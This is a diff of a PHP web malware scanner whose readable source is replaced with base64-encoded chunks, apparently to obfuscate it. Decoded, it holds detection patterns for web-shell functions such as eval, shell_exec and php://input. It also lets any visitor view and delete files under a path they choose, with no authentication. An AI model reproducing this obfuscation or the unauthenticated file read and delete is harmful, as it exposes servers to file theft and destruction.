@@ -1,558 +1,858 @@
 <?php
-/**
- * PHP Malware Scanner V2 - Premium Edition
- * Features: High-performance scanning, Gold/Black Premium UI, Bulk Delete, Enhanced Patterns
- */
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "LyoqDQogKiBQSFAgTWFsd2FyZSBTY2";
+$z .= "FubmVyIFYyIC0gUHJlbWl1bSBFZGl0";
+$z .= "aW9uDQogKiBGZWF0dXJlczogSGlnaC";
+$z .= "1wZXJmb3JtYW5jZSBzY2FubmluZywg";
+$z .= "R29sZC9CbGFjayBQcmVtaXVtIFVJLC";
+$z .= "BCdWxrIERlbGV0ZSwgRW5oYW5jZWQg";
+$z .= "UGF0dGVybnMNCiAqLw0KDQplcnJvcl";
+$z .= "9yZXBvcnRpbmcoMCk7DQpzZXRfdGlt";
+$z .= "ZV9saW1pdCgwKTsNCg0KJGJhc2UgPS";
+$z .= "Bpc3NldCgkX0dFVFsncGF0aCddKSA/";
+$z .= "IHJlYWxwYXRoKCRfR0VUWydwYXRoJ1";
+$z .= "0pIDogZ2V0Y3dkKCk7DQoNCi8vIC0t";
+$z .= "LSBWSUVXIENPREUgUk9VVEVSIC0tLQ";
+$z .= "0KaWYgKGlzc2V0KCRfR0VUWyd2aWV3";
+$z .= "X2NvZGUnXSkpIHsNCiAgICAkZmlsZV";
+$z .= "RvVmlldyA9IHJlYWxwYXRoKCRfR0VU";
+$z .= "Wyd2aWV3X2NvZGUnXSk7DQogICAgaW";
+$z .= "YgKCRmaWxlVG9WaWV3ICYmIHN0cnBv";
+$z .= "cygkZmlsZVRvVmlldywgJGJhc2UpID";
+$z .= "09PSAwICYmIGlzX2ZpbGUoJGZpbGVU";
+$z .= "b1ZpZXcpKSB7DQogICAgICAgIGVjaG";
+$z .= "8gIjwhRE9DVFlQRSBodG1sPjxodG1s";
+$z .= "IHN0eWxlPSdiYWNrZ3JvdW5kOiMwMD";
+$z .= "A7Y29sb3I6I2ZmZjtmb250LWZhbWls";
+$z .= "eTptb25vc3BhY2U7cGFkZGluZzoyMH";
+$z .= "B4Oyc+PGhlYWQ+PHRpdGxlPlZpZXdp";
+$z .= "bmc6ICIuaHRtbHNwZWNpYWxjaGFycy";
+$z .= "hiYXNlbmFtZSgkZmlsZVRvVmlldykp";
+$z .= "LiI8L3RpdGxlPjwvaGVhZD48Ym9keT";
+$z .= "4iOw0KICAgICAgICBlY2hvICI8aDIg";
+$z .= "c3R5bGU9J2NvbG9yOiNGRkQ3MDA7Ym";
+$z .= "9yZGVyLWJvdHRvbToxcHggc29saWQg";
+$z .= "IzMzMztwYWRkaW5nLWJvdHRvbToxMH";
+$z .= "B4Oyc+U291cmNlIENvZGU6ICIuaHRt";
+$z .= "bHNwZWNpYWxjaGFycygkZmlsZVRvVm";
+$z .= "lldykuIjwvaDI+IjsNCiAgICAgICAg";
+$z .= "aGlnaGxpZ2h0X2ZpbGUoJGZpbGVUb1";
+$z .= "ZpZXcpOw0KICAgICAgICBlY2hvICI8";
+$z .= "L2JvZHk+PC9odG1sPiI7DQogICAgIC";
+$z .= "AgIGV4aXQ7DQogICAgfSBlbHNlIHsN";
+$z .= "CiAgICAgICAgZGllKCJVbmF1dGhvcm";
+$z .= "l6ZWQgb3IgaW52YWxpZCBmaWxlIHBh";
+$z .= "dGguIik7DQogICAgfQ0KfQ0KDQovLy";
+$z .= "BIYW5kbGUgU2VsZWN0aXZlIERlbGV0";
+$z .= "aW9uDQokZGVsZXRlU3RhdHVzID0gIi";
+$z .= "I7DQppZiAoJF9TRVJWRVJbJ1JFUVVF";
+$z .= "U1RfTUVUSE9EJ10gPT09ICdQT1NUJy";
+$z .= "AmJiBpc3NldCgkX1BPU1RbJ2RlbGV0";
+$z .= "ZV9maWxlcyddKSAmJiBpc19hcnJheS";
+$z .= "gkX1BPU1RbJ2RlbGV0ZV9maWxlcydd";
+$z .= "KSkgew0KICAgICRkZWxldGVkQ291bn";
+$z .= "QgPSAwOw0KICAgIGZvcmVhY2ggKCRf";
+$z .= "UE9TVFsnZGVsZXRlX2ZpbGVzJ10gYX";
+$z .= "MgJGZpbGUpIHsNCiAgICAgICAgJHJl";
+$z .= "YWxGaWxlID0gcmVhbHBhdGgoJGZpbG";
+$z .= "UpOw0KICAgICAgICAvLyBTZWN1cml0";
+$z .= "eSBjaGVjazogZW5zdXJlIGZpbGUgaX";
+$z .= "Mgd2l0aGluIG9yIGJlbG93IHRoZSBi";
+$z .= "YXNlIGRpcmVjdG9yeQ0KICAgICAgIC";
+$z .= "BpZiAoJHJlYWxGaWxlICYmIHN0cnBv";
+$z .= "cygkcmVhbEZpbGUsICRiYXNlKSA9PT";
+$z .= "0gMCAmJiBpc19maWxlKCRyZWFsRmls";
+$z .= "ZSkpIHsNCiAgICAgICAgICAgIGlmIC";
+$z .= "hAdW5saW5rKCRyZWFsRmlsZSkpIHsN";
+$z .= "CiAgICAgICAgICAgICAgICAkZGVsZX";
+$z .= "RlZENvdW50Kys7DQogICAgICAgICAg";
+$z .= "ICB9DQogICAgICAgIH0NCiAgICB9DQ";
+$z .= "ogICAgJGRlbGV0ZVN0YXR1cyA9ICJT";
+$z .= "dWNjZXNzZnVsbHkgZGVsZXRlZCAkZG";
+$z .= "VsZXRlZENvdW50IGZpbGUocykuIjsN";
+$z .= "Cn0NCg0KJHBhdHRlcm5zID0gWw0KIC";
+$z .= "AgICcvZXZhbFxzKlwoL2knLA0KICAg";
+$z .= "ICcvYmFzZTY0X2RlY29kZVxzKlwoL2";
+$z .= "knLA0KICAgICcvZ3ppbmZsYXRlXHMq";
+$z .= "XCgvaScsDQogICAgJy9hc3NlcnRccy";
+$z .= "pcKC9pJywNCiAgICAnL3ByZWdfcmVw";
+$z .= "bGFjZVxzKlwoLipcL2UvaScsDQogIC";
+$z .= "AgJy8oc3lzdGVtfHNoZWxsX2V4ZWN8";
+$z .= "cGFzc3RocnV8ZXhlYylccypcKC9pJy";
+$z .= "wNCiAgICAnL3BocDpcL1wvaW5wdXQv";
+$z .= "aScsDQogICAgJy9jdXJsXyhpbml0fG";
+$z .= "V4ZWN8c2V0b3B0KS9pJywNCiAgICAn";
+$z .= "L2ZpbGVfZ2V0X2NvbnRlbnRzXHMqXC";
+$z .= "gvaScsDQogICAgJy9mb3BlblxzKlwo";
+$z .= "L2knLA0KICAgICcvc3RyZWFtX2dldF";
+$z .= "9jb250ZW50cy9pJywNCiAgICAnL2lu";
+$z .= "Y2x1ZGVccypcKFxzKlwkW2EtejAtOV";
+$z .= "9dK1xzKlwpL2knLA0KICAgICcvcmVx";
+$z .= "dWlyZVxzKlwoXHMqXCRbYS16MC05X1";
+$z .= "0rXHMqXCkvaScsDQogICAgJy9bIlwn";
+$z .= "XVxzKlwuXHMqWyJcJ10vaScsDQogIC";
+$z .= "AgJy9tZDVccypcKFxzKlwkX1NFUlZF";
+$z .= "UlxzKlxbXHMqW1wnIl1IVFRQX0hPU1";
+$z .= "RbXCciXVxzKlxdL2knLA0KICAgICcv";
+$z .= "XC9kZXZcL3NobVwvL2knLA0KICAgIC";
+$z .= "cvcmF3XC5naXRodWJ1c2VyY29udGVu";
+$z .= "dFwuY29tL2knLA0KICAgICcvZ290b1";
+$z .= "xzK1thLXowLTlfXSsvaScsDQogICAg";
+$z .= "Jy9zdHJfcm90MTMvaScsDQogICAgJy";
+$z .= "9zdHJyZXYvaScsDQpdOw0KDQpmdW5j";
+$z .= "dGlvbiBpc19zaGVsbCgkY29kZSwgJH";
+$z .= "BhdHRlcm5zKSB7DQogICAgJHNjb3Jl";
+$z .= "ID0gMDsNCiAgICBmb3JlYWNoICgkcG";
+$z .= "F0dGVybnMgYXMgJHBhdHRlcm4pIHsN";
+$z .= "CiAgICAgICAgaWYgKHByZWdfbWF0Y2";
+$z .= "goJHBhdHRlcm4sICRjb2RlKSkgew0K";
+$z .= "ICAgICAgICAgICAgJHNjb3JlKys7DQ";
+$z .= "ogICAgICAgIH0NCiAgICB9DQogICAg";
+$z .= "cmV0dXJuICRzY29yZSA+PSAzOw0KfQ";
+$z .= "0KDQpmdW5jdGlvbiBzbmlwcGV0X3By";
+$z .= "ZXZpZXcoJGNvZGUsICRtYXRjaCkgew";
+$z .= "0KICAgICRwb3MgPSBzdHJpcG9zKCRj";
+$z .= "b2RlLCAkbWF0Y2gpOw0KICAgIHJldH";
+$z .= "VybiAkcG9zID09PSBmYWxzZSA/ICcn";
+$z .= "IDogc3Vic3RyKCRjb2RlLCBtYXgoMC";
+$z .= "wgJHBvcyAtIDUwKSwgMzAwKTsNCn0N";
+$z .= "Cg0KZnVuY3Rpb24gc2Nhbl9mb2xkZX";
+$z .= "IoJGRpciwgJHBhdHRlcm5zLCAmJHJl";
+$z .= "c3VsdHMsICRiYXNlKSB7DQogICAgJG";
+$z .= "l0ZW1zID0gQHNjYW5kaXIoJGRpcik7";
+$z .= "DQogICAgaWYgKCEkaXRlbXMpIHJldH";
+$z .= "VybjsNCg0KICAgIGZvcmVhY2ggKCRp";
+$z .= "dGVtcyBhcyAkaXRlbSkgew0KICAgIC";
+$z .= "AgICBpZiAoJGl0ZW0gPT09ICcuJyB8";
+$z .= "fCAkaXRlbSA9PT0gJy4uJykgY29udG";
+$z .= "ludWU7DQoNCiAgICAgICAgJHBhdGgg";
+$z .= "PSAkZGlyIC4gRElSRUNUT1JZX1NFUE";
+$z .= "FSQVRPUiAuICRpdGVtOw0KDQogICAg";
+$z .= "ICAgIGlmIChpc19kaXIoJHBhdGgpKS";
+$z .= "B7DQogICAgICAgICAgICBzY2FuX2Zv";
+$z .= "bGRlcigkcGF0aCwgJHBhdHRlcm5zLC";
+$z .= "AkcmVzdWx0cywgJGJhc2UpOw0KICAg";
+$z .= "ICAgICB9IGVsc2VpZiAocHJlZ19tYX";
+$z .= "RjaCgnL1wuKHBocHxwaHRtbCkkL2kn";
+$z .= "LCAkaXRlbSkgJiYgZmlsZXNpemUoJH";
+$z .= "BhdGgpIDwgMjAwMDAwMCkgew0KICAg";
+$z .= "ICAgICAgICAgJGNvZGUgPSBAZmlsZV";
+$z .= "9nZXRfY29udGVudHMoJHBhdGgpOw0K";
+$z .= "ICAgICAgICAgICAgZm9yZWFjaCAoJH";
+$z .= "BhdHRlcm5zIGFzICRwYXR0ZXJuKSB7";
+$z .= "DQogICAgICAgICAgICAgICAgaWYgKH";
+$z .= "ByZWdfbWF0Y2goJHBhdHRlcm4sICRj";
+$z .= "b2RlLCAkbWF0Y2gpICYmIGlzX3NoZW";
+$z .= "xsKCRjb2RlLCAkcGF0dGVybnMpKSB7";
+$z .= "DQogICAgICAgICAgICAgICAgICAgIC";
+$z .= "RyZXN1bHRzW10gPSBbDQogICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAnZmlsZS";
+$z .= "cgICAgPT4gJHBhdGgsDQogICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAnbWF0Y2";
+$z .= "gnICAgPT4gJG1hdGNoWzBdLA0KICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgJ3";
+$z .= "NuaXBwZXQnID0+IHNuaXBwZXRfcHJl";
+$z .= "dmlldygkY29kZSwgJG1hdGNoWzBdKS";
+$z .= "wNCiAgICAgICAgICAgICAgICAgICAg";
+$z .= "XTsNCiAgICAgICAgICAgICAgICAgIC";
+$z .= "AgYnJlYWs7DQogICAgICAgICAgICAg";
+$z .= "ICAgfQ0KICAgICAgICAgICAgfQ0KIC";
+$z .= "AgICAgICB9DQogICAgfQ0KfQ0KDQok";
+$z .= "cmVzdWx0cyA9IFtdOw0Kc2Nhbl9mb2";
+$z .= "xkZXIoJGJhc2UsICRwYXR0ZXJucywg";
+$z .= "JHJlc3VsdHMsICRiYXNlKTsNCj8+DQ";
+$z .= "o8IURPQ1RZUEUgaHRtbD4NCjxodG1s";
+$z .= "IGxhbmc9ImlkIj4NCjxoZWFkPg0KIC";
+$z .= "AgIDxtZXRhIGNoYXJzZXQ9InV0Zi04";
+$z .= "Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aW";
+$z .= "V3cG9ydCIgY29udGVudD0id2lkdGg9";
+$z .= "ZGV2aWNlLXdpZHRoLCBpbml0aWFsLX";
+$z .= "NjYWxlPTEuMCI+DQogICAgPHRpdGxl";
+$z .= "PlNjYW5uZXIgSkJWMiB8IFByZW1pdW";
+$z .= "0gU2VjdXJpdHk8L3RpdGxlPg0KICAg";
+$z .= "IDxsaW5rIGhyZWY9Imh0dHBzOi8vZm";
+$z .= "9udHMuZ29vZ2xlYXBpcy5jb20vY3Nz";
+$z .= "Mj9mYW1pbHk9T3JiaXRyb246d2dodE";
+$z .= "A0MDA7NzAwJmZhbWlseT1JbnRlcjp3";
+$z .= "Z2h0QDQwMDs2MDAmZGlzcGxheT1zd2";
+$z .= "FwIiByZWw9InN0eWxlc2hlZXQiPg0K";
+$z .= "ICAgIDxzdHlsZT4NCiAgICAgICAgOn";
+$z .= "Jvb3Qgew0KICAgICAgICAgICAgLS1n";
+$z .= "b2xkOiAjRkZENzAwOw0KICAgICAgIC";
+$z .= "AgICAgLS1kYXJrLWdvbGQ6ICNCODg2";
+$z .= "MEI7DQogICAgICAgICAgICAtLWJsYW";
+$z .= "NrOiAjMDAwMDAwOw0KICAgICAgICAg";
+$z .= "ICAgLS1jaGFyY29hbDogIzEyMTIxMj";
+$z .= "sNCiAgICAgICAgICAgIC0tZ2xhc3M6";
+$z .= "IHJnYmEoMjAsIDIwLCAyMCwgMC45KT";
+$z .= "sNCiAgICAgICAgICAgIC0tcmVkOiAj";
+$z .= "ZmY1MjUyOw0KICAgICAgICAgICAgLS";
+$z .= "1ncmVlbjogIzAwZmYwMDsNCiAgICAg";
+$z .= "ICAgfQ0KDQogICAgICAgIGJvZHkgew";
+$z .= "0KICAgICAgICAgICAgYmFja2dyb3Vu";
+$z .= "ZDogcmFkaWFsLWdyYWRpZW50KGNpcm";
+$z .= "NsZSBhdCBjZW50ZXIsICMxYTFhMWEg";
+$z .= "MCUsICMwMDAwMDAgMTAwJSk7DQogIC";
+$z .= "AgICAgICAgICBjb2xvcjogI2VlZTsN";
+$z .= "CiAgICAgICAgICAgIGZvbnQtZmFtaW";
+$z .= "x5OiAnSW50ZXInLCBzYW5zLXNlcmlm";
+$z .= "Ow0KICAgICAgICAgICAgbWFyZ2luOi";
+$z .= "AwOw0KICAgICAgICAgICAgcGFkZGlu";
+$z .= "ZzogMDsNCiAgICAgICAgICAgIC13ZW";
+$z .= "JraXQtZm9udC1zbW9vdGhpbmc6IGFu";
+$z .= "dGlhbGlhc2VkOw0KICAgICAgICB9DQ";
+$z .= "oNCiAgICAgICAgLmNvbnRhaW5lciB7";
+$z .= "DQogICAgICAgICAgICBtYXgtd2lkdG";
+$z .= "g6IDEwMDBweDsNCiAgICAgICAgICAg";
+$z .= "IG1hcmdpbjogNTBweCBhdXRvOw0KIC";
+$z .= "AgICAgICAgICAgcGFkZGluZzogMCAy";
+$z .= "MHB4Ow0KICAgICAgICB9DQoNCiAgIC";
+$z .= "AgICAgaGVhZGVyIHsNCiAgICAgICAg";
+$z .= "ICAgIHRleHQtYWxpZ246IGNlbnRlcj";
+$z .= "sNCiAgICAgICAgICAgIG1hcmdpbi1i";
+$z .= "b3R0b206IDUwcHg7DQogICAgICAgIC";
+$z .= "AgICBwb3NpdGlvbjogcmVsYXRpdmU7";
+$z .= "DQogICAgICAgIH0NCg0KICAgICAgIC";
+$z .= "BoMSB7DQogICAgICAgICAgICBmb250";
+$z .= "LWZhbWlseTogJ09yYml0cm9uJywgc2";
+$z .= "Fucy1zZXJpZjsNCiAgICAgICAgICAg";
+$z .= "IGNvbG9yOiB2YXIoLS1nb2xkKTsNCi";
+$z .= "AgICAgICAgICAgIHRleHQtdHJhbnNm";
+$z .= "b3JtOiB1cHBlcmNhc2U7DQogICAgIC";
+$z .= "AgICAgICBsZXR0ZXItc3BhY2luZzog";
+$z .= "NHB4Ow0KICAgICAgICAgICAgZm9udC";
+$z .= "1zaXplOiAyLjVlbTsNCiAgICAgICAg";
+$z .= "ICAgIG1hcmdpbjogMDsNCiAgICAgIC";
+$z .= "AgICAgIHRleHQtc2hhZG93OiAwIDAg";
+$z .= "MjBweCByZ2JhKDI1NSwgMjE1LCAwLC";
+$z .= "AwLjQpOw0KICAgICAgICB9DQoNCiAg";
+$z .= "ICAgICAgLnN1YnRpdGxlIHsNCiAgIC";
+$z .= "AgICAgICAgIGZvbnQtc2l6ZTogMC45";
+$z .= "ZW07DQogICAgICAgICAgICBjb2xvcj";
+$z .= "ogIzg4ODsNCiAgICAgICAgICAgIG1h";
+$z .= "cmdpbi10b3A6IDEwcHg7DQogICAgIC";
+$z .= "AgICAgICB0ZXh0LXRyYW5zZm9ybTog";
+$z .= "dXBwZXJjYXNlOw0KICAgICAgICAgIC";
+$z .= "AgbGV0dGVyLXNwYWNpbmc6IDJweDsN";
+$z .= "CiAgICAgICAgfQ0KDQogICAgICAgIC";
+$z .= "5zdGF0dXMtYmFyIHsNCiAgICAgICAg";
+$z .= "ICAgIGJhY2tncm91bmQ6IHZhcigtLW";
+$z .= "dsYXNzKTsNCiAgICAgICAgICAgIGJv";
+$z .= "cmRlcjogMXB4IHNvbGlkIHJnYmEoMj";
+$z .= "U1LCAyMTUsIDAsIDAuMik7DQogICAg";
+$z .= "ICAgICAgICBwYWRkaW5nOiAxNXB4ID";
+$z .= "I1cHg7DQogICAgICAgICAgICBib3Jk";
+$z .= "ZXItcmFkaXVzOiA1MHB4Ow0KICAgIC";
+$z .= "AgICAgICAgZGlzcGxheTogZmxleDsN";
+$z .= "CiAgICAgICAgICAgIGp1c3RpZnktY2";
+$z .= "9udGVudDogc3BhY2UtYmV0d2VlbjsN";
+$z .= "CiAgICAgICAgICAgIGFsaWduLWl0ZW";
+$z .= "1zOiBjZW50ZXI7DQogICAgICAgICAg";
+$z .= "ICBtYXJnaW4tYm90dG9tOiAzMHB4Ow";
+$z .= "0KICAgICAgICAgICAgYmFja2Ryb3At";
+$z .= "ZmlsdGVyOiBibHVyKDEwcHgpOw0KIC";
+$z .= "AgICAgICAgICAgYm94LXNoYWRvdzog";
+$z .= "MCAxMHB4IDMwcHggcmdiYSgwLDAsMC";
+$z .= "wwLjUpOw0KICAgICAgICB9DQoNCiAg";
+$z .= "ICAgICAgLnBhdGgtaW5mbyB7DQogIC";
+$z .= "AgICAgICAgICBmb250LWZhbWlseTog";
+$z .= "bW9ub3NwYWNlOw0KICAgICAgICAgIC";
+$z .= "AgZm9udC1zaXplOiAwLjllbTsNCiAg";
+$z .= "ICAgICAgICAgIGNvbG9yOiB2YXIoLS";
+$z .= "1nb2xkKTsNCiAgICAgICAgfQ0KDQog";
+$z .= "ICAgICAgIC5hY3Rpb25zIHsNCiAgIC";
+$z .= "AgICAgICAgIGRpc3BsYXk6IGZsZXg7";
+$z .= "DQogICAgICAgICAgICBnYXA6IDE1cH";
+$z .= "g7DQogICAgICAgIH0NCg0KICAgICAg";
+$z .= "ICAuYnRuIHsNCiAgICAgICAgICAgIH";
+$z .= "BhZGRpbmc6IDEwcHggMjBweDsNCiAg";
+$z .= "ICAgICAgICAgIGJvcmRlci1yYWRpdX";
+$z .= "M6IDUwcHg7DQogICAgICAgICAgICBm";
+$z .= "b250LWZhbWlseTogJ09yYml0cm9uJy";
+$z .= "wgc2Fucy1zZXJpZjsNCiAgICAgICAg";
+$z .= "ICAgIGZvbnQtc2l6ZTogMC44ZW07DQ";
+$z .= "ogICAgICAgICAgICBmb250LXdlaWdo";
+$z .= "dDogNzAwOw0KICAgICAgICAgICAgY3";
+$z .= "Vyc29yOiBwb2ludGVyOw0KICAgICAg";
+$z .= "ICAgICAgdHJhbnNpdGlvbjogMC4zcz";
+$z .= "sNCiAgICAgICAgICAgIHRleHQtZGVj";
+$z .= "b3JhdGlvbjogbm9uZTsNCiAgICAgIC";
+$z .= "AgICAgIGJvcmRlcjogbm9uZTsNCiAg";
+$z .= "ICAgICAgICAgIHRleHQtdHJhbnNmb3";
+$z .= "JtOiB1cHBlcmNhc2U7DQogICAgICAg";
+$z .= "IH0NCg0KICAgICAgICAuYnRuLWdvbG";
+$z .= "Qgew0KICAgICAgICAgICAgYmFja2dy";
+$z .= "b3VuZDogbGluZWFyLWdyYWRpZW50KD";
+$z .= "EzNWRlZywgdmFyKC0tZ29sZCksIHZh";
+$z .= "cigtLWRhcmstZ29sZCkpOw0KICAgIC";
+$z .= "AgICAgICAgY29sb3I6IGJsYWNrOw0K";
+$z .= "ICAgICAgICAgICAgYm94LXNoYWRvdz";
+$z .= "ogMCA1cHggMTVweCByZ2JhKDIxOCwg";
+$z .= "MTY1LCAzMiwgMC40KTsNCiAgICAgIC";
+$z .= "AgfQ0KDQogICAgICAgIC5idG4tZ29s";
+$z .= "ZDpob3ZlciB7DQogICAgICAgICAgIC";
+$z .= "B0cmFuc2Zvcm06IHRyYW5zbGF0ZVko";
+$z .= "LTJweCk7DQogICAgICAgICAgICBib3";
+$z .= "gtc2hhZG93OiAwIDhweCAyMHB4IHJn";
+$z .= "YmEoMjE4LCAxNjUsIDMyLCAwLjYpOw";
+$z .= "0KICAgICAgICB9DQoNCiAgICAgICAg";
+$z .= "LmJ0bi1vdXRsaW5lIHsNCiAgICAgIC";
+$z .= "AgICAgIGJhY2tncm91bmQ6IHRyYW5z";
+$z .= "cGFyZW50Ow0KICAgICAgICAgICAgYm";
+$z .= "9yZGVyOiAxcHggc29saWQgdmFyKC0t";
+$z .= "Z29sZCk7DQogICAgICAgICAgICBjb2";
+$z .= "xvcjogdmFyKC0tZ29sZCk7DQogICAg";
+$z .= "ICAgIH0NCg0KICAgICAgICAuYnRuLW";
+$z .= "91dGxpbmU6aG92ZXIgew0KICAgICAg";
+$z .= "ICAgICAgYmFja2dyb3VuZDogcmdiYS";
+$z .= "gyNTUsIDIxNSwgMCwgMC4xKTsNCiAg";
+$z .= "ICAgICAgfQ0KDQogICAgICAgIC5idG";
+$z .= "4tcmVkIHsNCiAgICAgICAgICAgIGJh";
+$z .= "Y2tncm91bmQ6IGxpbmVhci1ncmFkaW";
+$z .= "VudCgxMzVkZWcsICNmZjUyNTIsICNi";
+$z .= "NzFjMWMpOw0KICAgICAgICAgICAgY2";
+$z .= "9sb3I6IHdoaXRlOw0KICAgICAgICAg";
+$z .= "ICAgYm94LXNoYWRvdzogMCA1cHggMT";
+$z .= "VweCByZ2JhKDI1NSwgODIsIDgyLCAw";
+$z .= "LjMpOw0KICAgICAgICB9DQoNCiAgIC";
+$z .= "AgICAgLmJ0bi1yZWQ6aG92ZXIgew0K";
+$z .= "ICAgICAgICAgICAgdHJhbnNmb3JtOi";
+$z .= "B0cmFuc2xhdGVZKC0ycHgpOw0KICAg";
+$z .= "ICAgICAgICAgYm94LXNoYWRvdzogMC";
+$z .= "A4cHggMjBweCByZ2JhKDI1NSwgODIs";
+$z .= "IDgyLCAwLjUpOw0KICAgICAgICB9DQ";
+$z .= "oNCiAgICAgICAgLmJ0bi1jb2Rpbmcg";
+$z .= "ew0KICAgICAgICAgICAgYmFja2dyb3";
+$z .= "VuZDogIzFhMWExYTsNCiAgICAgICAg";
+$z .= "ICAgIGJvcmRlcjogMXB4IHNvbGlkIC";
+$z .= "M0NDQ7DQogICAgICAgICAgICBjb2xv";
+$z .= "cjogIzBmMDsNCiAgICAgICAgICAgIH";
+$z .= "BhZGRpbmc6IDVweCAxMnB4Ow0KICAg";
+$z .= "ICAgICAgICAgZm9udC1zaXplOiAxMH";
+$z .= "B4Ow0KICAgICAgICAgICAgbWFyZ2lu";
+$z .= "LWxlZnQ6IDEwcHg7DQogICAgICAgIC";
+$z .= "AgICBkaXNwbGF5OiBpbmxpbmUtZmxl";
+$z .= "eDsNCiAgICAgICAgICAgIGFsaWduLW";
+$z .= "l0ZW1zOiBjZW50ZXI7DQogICAgICAg";
+$z .= "ICAgICBnYXA6IDVweDsNCiAgICAgIC";
+$z .= "AgICAgIGJvcmRlci1yYWRpdXM6IDVw";
+$z .= "eDsNCiAgICAgICAgICAgIGN1cnNvcj";
+$z .= "ogcG9pbnRlcjsNCiAgICAgICAgICAg";
+$z .= "IHRyYW5zaXRpb246IDAuM3M7DQogIC";
+$z .= "AgICAgIH0NCg0KICAgICAgICAuYnRu";
+$z .= "LWNvZGluZzpob3ZlciB7DQogICAgIC";
+$z .= "AgICAgICBiYWNrZ3JvdW5kOiAjMzMz";
+$z .= "Ow0KICAgICAgICAgICAgYm9yZGVyLW";
+$z .= "NvbG9yOiAjMGYwOw0KICAgICAgICAg";
+$z .= "ICAgYm94LXNoYWRvdzogMCAwIDEwcH";
+$z .= "ggcmdiYSgwLCAyNTUsIDAsIDAuMik7";
+$z .= "DQogICAgICAgIH0NCg0KICAgICAgIC";
+$z .= "AucmVzdWx0LWNhcmQgew0KICAgICAg";
+$z .= "ICAgICAgYmFja2dyb3VuZDogdmFyKC";
+$z .= "0tZ2xhc3MpOw0KICAgICAgICAgICAg";
+$z .= "Ym9yZGVyOiAxcHggc29saWQgcmdiYS";
+$z .= "gyNTUsIDIxNSwgMCwgMC4xKTsNCiAg";
+$z .= "ICAgICAgICAgIGJvcmRlci1yYWRpdX";
+$z .= "M6IDE1cHg7DQogICAgICAgICAgICBw";
+$z .= "YWRkaW5nOiAyNXB4Ow0KICAgICAgIC";
+$z .= "AgICAgbWFyZ2luLWJvdHRvbTogMjBw";
+$z .= "eDsNCiAgICAgICAgICAgIHBvc2l0aW";
+$z .= "9uOiByZWxhdGl2ZTsNCiAgICAgICAg";
+$z .= "ICAgIHRyYW5zaXRpb246IDAuM3M7DQ";
+$z .= "ogICAgICAgICAgICBvdmVyZmxvdzog";
+$z .= "aGlkZGVuOw0KICAgICAgICB9DQoNCi";
+$z .= "AgICAgICAgLnJlc3VsdC1jYXJkOmhv";
+$z .= "dmVyIHsNCiAgICAgICAgICAgIGJvcm";
+$z .= "Rlci1jb2xvcjogcmdiYSgyNTUsMjE1";
+$z .= "LCAwLCAwLjMpOw0KICAgICAgICAgIC";
+$z .= "AgYmFja2dyb3VuZDogcmdiYSgzMCwg";
+$z .= "MzAsIDMwLCAwLjk1KTsNCiAgICAgIC";
+$z .= "AgfQ0KDQogICAgICAgIC5yZXN1bHQt";
+$z .= "Y2FyZC52aWV3ZWQgew0KICAgICAgIC";
+$z .= "AgICAgYm9yZGVyLWNvbG9yOiB2YXIo";
+$z .= "LS1ncmVlbik7DQogICAgICAgICAgIC";
+$z .= "BiYWNrZ3JvdW5kOiByZ2JhKDAsIDI1";
+$z .= "NSwgMCwgMC4wOCk7DQogICAgICAgIC";
+$z .= "AgICBib3gtc2hhZG93OiAwIDAgMzBw";
+$z .= "eCByZ2JhKDAsIDI1NSwgMCwgMC4yKT";
+$z .= "sNCiAgICAgICAgfQ0KDQogICAgICAg";
+$z .= "IC52aWV3ZWQtYmFkZ2Ugew0KICAgIC";
+$z .= "AgICAgICAgZGlzcGxheTogbm9uZTsN";
+$z .= "CiAgICAgICAgICAgIHBvc2l0aW9uOi";
+$z .= "BhYnNvbHV0ZTsNCiAgICAgICAgICAg";
+$z .= "IHRvcDogMTVweDsNCiAgICAgICAgIC";
+$z .= "AgIHJpZ2h0OiAxODBweDsNCiAgICAg";
+$z .= "ICAgICAgIGJhY2tncm91bmQ6IHZhci";
+$z .= "gtLWdyZWVuKTsNCiAgICAgICAgICAg";
+$z .= "IGNvbG9yOiBibGFjazsNCiAgICAgIC";
+$z .= "AgICAgIGZvbnQtc2l6ZTogMTBweDsN";
+$z .= "CiAgICAgICAgICAgIGZvbnQtd2VpZ2";
+$z .= "h0OiA5MDA7DQogICAgICAgICAgICBw";
+$z .= "YWRkaW5nOiA0cHggMTBweDsNCiAgIC";
+$z .= "AgICAgICAgIGJvcmRlci1yYWRpdXM6";
+$z .= "IDVweDsNCiAgICAgICAgICAgIHRleH";
+$z .= "QtdHJhbnNmb3JtOiB1cHBlcmNhc2U7";
+$z .= "DQogICAgICAgICAgICBsZXR0ZXItc3";
+$z .= "BhY2luZzogMXB4Ow0KICAgICAgICAg";
+$z .= "ICAgYm94LXNoYWRvdzogMCAwIDEwcH";
+$z .= "ggdmFyKC0tZ3JlZW4pOw0KICAgICAg";
+$z .= "ICAgICAgYW5pbWF0aW9uOiBwdWxzZS";
+$z .= "1ncmVlbiAycyBpbmZpbml0ZTsNCiAg";
+$z .= "ICAgICAgfQ0KDQogICAgICAgIC5yZX";
+$z .= "N1bHQtY2FyZC52aWV3ZWQgLnZpZXdl";
+$z .= "ZC1iYWRnZSB7DQogICAgICAgICAgIC";
+$z .= "BkaXNwbGF5OiBibG9jazsNCiAgICAg";
+$z .= "ICAgfQ0KDQogICAgICAgIEBrZXlmcm";
+$z .= "FtZXMgcHVsc2UtZ3JlZW4gew0KICAg";
+$z .= "ICAgICAgICAgMCUgeyBvcGFjaXR5Oi";
+$z .= "AwLjc7IH0NCiAgICAgICAgICAgIDUw";
+$z .= "JSB7IG9wYWNpdHk6IDE7IH0NCiAgIC";
+$z .= "AgICAgICAgIDEwMCUgeyBvcGFjaXR5";
+$z .= "OiAwLjc7IH0NCiAgICAgICAgfQ0KDQ";
+$z .= "ogICAgICAgIC5jYXJkLWhlYWRlciB7";
+$z .= "DQogICAgICAgICAgICBkaXNwbGF5Oi";
+$z .= "BmbGV4Ow0KICAgICAgICAgICAganVz";
+$z .= "dGlmeS1jb250ZW50OiBzcGFjZS1iZX";
+$z .= "R3ZWVuOw0KICAgICAgICAgICAgYWxp";
+$z .= "Z24taXRlbXM6IGZsZXgtc3RhcnQ7DQ";
+$z .= "ogICAgICAgICAgICBtYXJnaW4tYm90";
+$z .= "dG9tOiAxNXB4Ow0KICAgICAgICB9DQ";
